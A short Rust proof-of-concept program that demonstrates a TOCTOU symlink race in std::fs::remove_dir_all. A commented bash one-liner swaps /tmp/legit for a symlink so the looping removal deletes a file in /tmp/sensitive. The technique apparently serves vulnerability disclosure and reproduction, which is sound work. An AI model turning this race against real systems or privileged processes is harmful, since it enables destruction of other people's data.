use std::fs::{create_dir, remove_dir_all, write};
use std::path::Path;

fn main() {
    // Directory to delete thanks to the TOCTOU issue
    let target_dir = Path::new("/tmp/sensitive/");
    create_dir(target_dir).unwrap();
    let target = target_dir.join("do_not_remove");
    write(
        target.clone(),
        "I contain sensitive data. Please do not delete me\n",
    )
    .expect("Unable to write to target file");

    // Legitimate directory that will be used to trick std::fs::remove_dir_all()
    let legit_dir = Path::new("/tmp/legit/");

    // Use the following bash one liner to trigger the bug
    //
    // while :; do mkdir /tmp/legit; rm -r /tmp/legit; ln -s /tmp/sensitive /tmp/legit; done
    //              ^                    ^                    ^
    //              |                    |                    |
    //            1. pass TOC        2. delete directory    3. Point to target data
    //                                  before TOU             before TOU
    //
    // Note: The `mkdir /tmp/legit` command could fail since the /tmp/legit
    //       could be a symlink. This is normal.

    println!("Make sure to have run the bash one-liner :)");

    // We're continuously removing a legitimate directory,
    //
    // If the TOCTOU is exploited, one of the remove_dir_all() call will
    // first check that the `legit_dir` exists (1), and is not a symlink, then
    // it will be replaced (2) by a symlink (3) to the file that should not be
    // deleted

    let mut count = 1;
    loop {
        // Ignore remove_dir_all Result since the directory may already exist
        let _ = remove_dir_all(legit_dir);

        if !target.exists() {
            println!("Target file has been deleted in {} tries.", count);
            break;
        }

        count += 1;

        if count % 1_000 == 0 {
            println!("Thread: {} iterations", count);
        }
    }
}
